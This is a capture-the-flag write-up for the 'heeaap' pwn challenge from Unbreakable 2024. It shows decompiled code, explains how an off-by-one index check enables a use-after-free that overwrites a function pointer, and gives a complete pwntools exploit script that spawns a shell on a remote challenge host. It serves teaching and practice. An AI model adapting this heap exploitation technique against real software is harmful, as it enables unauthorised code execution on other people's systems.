---
title: heeaap
type: writeup
date: 2024-04-07T14:23:28+03:00
description: Writeup for heeaap [Unbreakable 2024]
author: sunbather
tags:
- pwn
- heap
draft: false
---
___

## Challenge Description

Since strground was "too hard"...

## Intuition

We get a classic, easy heap challenge, with a UAF bug. Two different kind of structures are allocated on the heap, one of 64 bytes and one of 72. From each of them, we control the first 52, respectively 60 bytes. At the end of each, a function pointer for a print function is being assigned. We also have a win function in the binary, that simply calls ``system("/bin/sh")``. Cleaned up main function below:

```c
void main(void)
{
  long lVar1;
  ctf_struct *ptr;
  desc_struct *pdVar2;
  long in_FS_OFFSET;
  undefined4 menu_opt;
  int print_idx;
  long details [7];
  uint idx;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  do {
    if ((3 < (int)i) || (3 < (int)j)) {
      if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
      }
      return;
    }
    puts("--------------------------");
    puts("1. Create new ctf");
    puts("2. Create ctf description");
    puts("3. Delete ctf");
    puts("4. Delete description");
    puts("5. Print ctf && description");
    puts("--------------------------");
    fwrite("Choose: ",1,8,stdout);
    __isoc99_scanf("%d",&menu_opt);
    switch(menu_opt) {
    default:
      puts("Not a choice");
      exit(0);
    case 1:
      if ((int)j < (int)i) {
        puts("You need to create a description for every ctf!");
        exit(0);
      }
      details[0] = 0;
      details[1] = 0;
      details[2] = 0;
      details[3] = 0;
      details[4] = 0;
      details[5] = 0;
      details[6] = details[6] & 0xffffffff00000000;
      fwrite("Enter ctf details: ",1,0x13,stdout);
      read(0,details,0x34);
      idx = i;
      ptr = (ctf_struct *)malloc(0x40);
      ctfs[(int)idx] = ptr;
      ptr = ctfs[(int)i];
      *(long *)ptr->description = details[0];
      *(long *)(ptr->description + 8) = details[1];
      *(long *)(ptr->description + 0x10) = details[2];
      *(long *)(ptr->description + 0x18) = details[3];
      *(long *)(ptr->description + 0x20) = details[4];
      *(long *)(ptr->description + 0x28) = details[5];
      *(undefined4 *)(ptr->description + 0x30) = (undefined4)details[6];
      ctfs[(int)i]->print_func = print_current_ctf;
      printf("\nCtf created at index: %d\n",(ulong)i);
      i = i + 1;
      break;
    case 2:
      if ((int)i < (int)j) {
        puts("You need to create a ctf for every description!");
        exit(0);
      }
      details[0] = 0;
      details[1] = 0;
      details[2] = 0;
      details[3] = 0;
      details[4] = 0;
      details[5] = 0;
      details[6] = 0;
      fwrite("Enter ctf description: ",1,0x17,stdout);
      read(0,details,0x3c);
      idx = j;
      pdVar2 = (desc_struct *)malloc(0x48);
      descriptions[(int)idx] = pdVar2;
      pdVar2 = descriptions[(int)j];
      *(long *)pdVar2->details = details[0];
      *(long *)(pdVar2->details + 8) = details[1];
      *(long *)(pdVar2->details + 0x10) = details[2];
      *(long *)(pdVar2->details + 0x18) = details[3];
      *(long *)(pdVar2->details + 0x20) = details[4];
      *(long *)(pdVar2->details + 0x28) = details[5];
      *(long *)(pdVar2->details + 0x30) = details[6];
      *(undefined4 *)(pdVar2->details + 0x38) = 0;
      descriptions[(int)j]->print_desc = print_ctf_description;
      printf("\nDescription created at index: %d\n",(ulong)j);
      j = j + 1;
      break;
    case 3:
      if (i == 0) {
        puts("No ctfs created yet.");
        exit(0);
      }
      i = i - 1;
      free(ctfs[(int)i]);
      puts("\nDeleted ctf.\n");
      break;
    case 4:
      if (j == 0) {
        puts("No descriptions created yet.");
        exit(0);
      }
      j = j - 1;
      free(descriptions[(int)j]);
      puts("\nDeleted description.\n");
      break;
    case 5:
      if ((i == 0) || (j == 0)) {
        puts("No ctf or description.");
        exit(0);
      }
      fwrite("Select index: ",1,0xe,stdout);
      __isoc99_scanf("%d",&print_idx);
      if ((((int)i < print_idx) || ((int)j < print_idx)) || (print_idx < 0)) {
        puts("Not allowed");
        exit(0);
      }
      (*(code *)ctfs[print_idx]->print_func)(ctfs[print_idx]);
      (*(code *)descriptions[print_idx]->print_desc)(descriptions[print_idx]);
    }
  } while( true );
```

We created the structures in Ghidra struct editor so the decompilation is easier to read. The essential bug is at case 5, when we use the print functions stored in the function pointers. Notice how case 5 checks if the index we are requesting to print is bigger (strictly) than the current i, which should be the last position where a CTF + description combo is found. However, this is not actually true, ``i`` and ``j`` are the indices of the next free spots. Which means, by requesting exactly ``i`` or ``j`` we can print CTFs or descriptions that do not actually exist in our array.

In our case, if we free a CTF or a description and then allocate another one, the glibc heap allocator will reuse the one we've just freed. That, combined with bad input validation on case 5, will let us execute a Use-After-Free. We can, in theory, allocate the smaller structure (CTF), free it and then allocate the bigger structure. Since we control 60 bytes of the bigger structure, we can overwrite 8 bytes at the end of the first structure. Sadly, 4 bytes of the overwritten ones are structure padding, but we can still overwrite 4 bytes least significant bytes of the function pointer for the smaller structure. Which is great, because in little endian with no PIE, that’s all we need to overwrite it.

So the plan is:
1. Allocate dummy CTF & description (to bypass the print check: ``if ((i == 0) || (j == 0))`` )
2. Allocate CTF
3. Free CTF
4. Allocate description for which the last 4 bytes are the address of the win function
5. Print CTF with index 1

When we hit the last step, the line ``(*(code *)ctfs[print_idx]->print_func)(ctfs[print_idx]);`` will call the overwritten win function, giving us a shell.

## Solution

```py
#!/usr/bin/env python3

from pwn import *

#target = process("./heap")
target = remote("35.234.88.19", 32668)
win_addr = 0x004012db

def create_ctf(details):
    target.sendline(b"1")
    target.send(details)

def create_desc(description):
    target.sendline(b"2")
    target.send(description)

def delete_ctf():
    target.sendline(b"3")

def delete_desc():
    target.sendline(b"4")

def print_ctf(index):
    target.sendline(b"5")
    target.sendline(str(index).encode())

create_ctf(b".hidden" + b"a" * 45)
create_desc(b"d" * 60)

create_ctf(b"a" * 52)
delete_ctf()
create_desc(b"d" * 56 + p32(win_addr))

print_ctf(1)
target.interactive()
```
